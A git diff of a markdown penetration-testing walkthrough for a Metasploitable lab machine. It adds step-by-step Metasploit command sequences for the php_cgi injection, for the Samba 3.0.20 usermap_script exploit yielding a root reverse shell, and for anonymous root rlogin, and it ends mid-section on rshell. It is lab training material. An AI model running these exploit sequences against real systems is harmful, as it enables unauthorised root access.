@@ -473,10 +473,10 @@ searchsploit apache 2.2.8 | grep php
 ```
 Output:
 ![](../images/searching_vulnerability_on_apache.png)
-**1. Cgi-bin Remote code execution Vulnerability**
+**1. php_cgi arguement injection(Remote code execution) Vulnerability**
 
 ### Exploitation
-#### 1. Exploit cgi-bin Remote code execution Vulnerability in php
+#### 1. Exploit php_cgi Remote code execution Vulnerability in php
 ```
 msfconsole
 msf > search php_cgi
@@ -492,3 +492,78 @@ msf exploit(multi/http/php_cgi_arg_injection) > exploit
 ![](../images/exploitation_using_cgi_arg_injection_3.png)
 ![](../images/exploitation_using_cgi_arg_injection_4.png)
 After executing the exploit we get a meterpreter session establised with the target using reverse_tcp. Now we can execute any command remotely on the target metasploitable machine.
+
+---
+## Exploiting Service on Port 139, 445: netbios-ssn Samba smbd 3.x-4.x
+**SMB(Server Message Block)** is a client/server protocol that is used for sharing access to files, printers, data and other resources on a network.
+
+Microsoft introduce netbios-ssn(Network basic input output system- session services) services using SMB protocol that run on Netbios sessions service and locate as well as identify each other devices using netbios name over tcp port 139 or 445 and Is used to share files, data and devices like printer over a LAN network mainly designed for windows-based network.
+**NetBIOS** helps resolve names of network devices to their IP addresses within a LAN, similar to how DNS works for internet-based names.
+**NetBIOS-SSN** (Session Service), running on TCP port 139, is responsible for establishing and managing sessions between computers on the same network for file and printer sharing. It’s used by the Server Message Block (SMB) protocol for managing access to shared resources like files and printers over a network.
+
+**Samba** is a suite of tools used on Linux (and other Unix-like systems) to implement SMB/CIFS (Server Message Block/Common Internet File System) protocol, which allows Linux systems to communicate with Windows machines for file and printer sharing. Samba enables a Linux system to participate in Windows networking, effectively replicating NetBIOS and SMB services traditionally found on Windows.
+
+Ports Used by Samba-> Samba uses a few key ports, depending on the configuration:
+**Port 139** (NetBIOS-SSN): Supports SMB over NetBIOS, especially for legacy systems that require NetBIOS.
+**Port 445** (SMB): Allows SMB to run directly over TCP without the NetBIOS layer. This is the preferred method in modern configurations, as it avoids the limitations and security issues associated with NetBIOS protocol.
+
+### Identifying Vulnerabilites or Weakness
+Firstly we have to identify the correct version of the smb service(samba version) running on the target, for that we have different tools like nmap scripts, metasploit modules etc. Here I am using the metasploit framework module to identify the exact version of smb running on the target.
+```
+msf > search smb_version
+msf > use auxiliary/scanner/smb/smb_version
+msf auxiliary(scanner/smb/smb_version) > options
+msf auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.103
+msf auxiliary(scanner/smb/smb_version) > set LPORT 139
+msf auxiliary(scanner/smb/smb_version) > show options
+msf auxiliary(scanner/smb/smb_version) > run
+```
+**Output**
+![]
+From this module output we conclude that target is running samba 3.0.20 and now we have to search for any exploit available for this version of samba
+### Exploitation
+```
+searchsploit samba | grep 3.0.20
+```
+Here we got an usermap_script module of metasploit, that can exploit this samba version
+```
+msfconsole -q
+msf > search usermap_script
+msf > use exploit/multi/samba/usermap_script
+msf exploit(multi/samba/usermap_script) > show options
+msf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.1.103
+msf exploit(multi/samba/usermap_script) > run
+```
+**Output**
+[]
+After executing the exploit we get a root user session establised with the target using reverse_tcp. Now we can execute any command remotely on the target metasploitable machine.
+
+---
+## Exploiting Service on Port 512,513,514: r-services
+The services running on ports 512, 513, and 514 on our Metasploitable machine are collectively known as "r-services," which include rexec, rlogin, and rshell. These services were popular in Unix-like systems for remote access and command execution but are generally considered insecure and outdated today due to their reliance on unencrypted communication and are mainly replaced by more secure protocol like ssh which uses encrypted communication.
+**1. rexec** The rexec (remote execution) service allows a user to execute commands on a remote machine. Authentication is done through the user's credentials (username and password) sent in plain text over the network.
+**2. rlogin**  The rlogin (remote login) service is used for logging into a remote machine from a local system. It provides a simple remote login interface and allows for command execution on the remote host. Unlike SSH, rlogin does not encrypt data, so any information, including login credentials, is sent as plaintext.
+**3. rshell** The rshell or rsh (remote shell) service allows users to run commands on a remote system from their local machine. Similar to rexec, rshell sends data, including authentication credentials, as plaintext.
+
+### Identifying Vulnerabilites or Weakness
+Since, these services rely on trust relationships (such as .rhosts files), which are prone to misconfigurations and unauthorized access. In this case, these services are misconfigured to allowed the anonymous login without password. SO it has **Anonymous login allowed vulerability**.
+
+### Exploitation
+To connect to these services using the anonymous login vulnerability we requires the rsh-client packages to connect to rsh target running the r-services. Sinces these services are outdated and not used in today for remote access, the rsh-client package is depricated by the kali package manager, but we can download the rsh-client package from the official debian package manager but here I am using the metasploitable module to connect with the rservices running on the target.
+**for rexec** we don't find any module and rexec command to exploit the rexec service
+**for rlogin** we had an module on the metasploit that can be used to connect to rlogin service running on the target.
+```
+msfconsole -q
+msf > search rlogin_login
+msf > use auxiliary/scanner/rservices/rlogin_login
+msf auxiliay(scanner/rservices/rlogin_login) > options
+msf auxiliay(scanner/rservices/rlogin_login) > set ANONYMOUS_LOGIN true
+msf auxiliay(scanner/rservices/rlogin_login) > set BLANK_PASSWORD true
+msf auxiliay(scanner/rservices/rlogin_login) > set RHOSTS 192.168.1.103
+msf auxiliay(scanner/rservices/rlogin_login) > set USERNAME root
+msf auxiliay(scanner/rservices/rlogin_login) > set STOP_ON_SUCCESS true
+msf auxiliay(scanner/rservices/rlogin_login) > show options
+msf auxiliay(scanner/rservices/rlogin_login) > run
+```
+**for rshell** we had a module on the metasploit that can be used to connect to rshell service running on the target.
+```
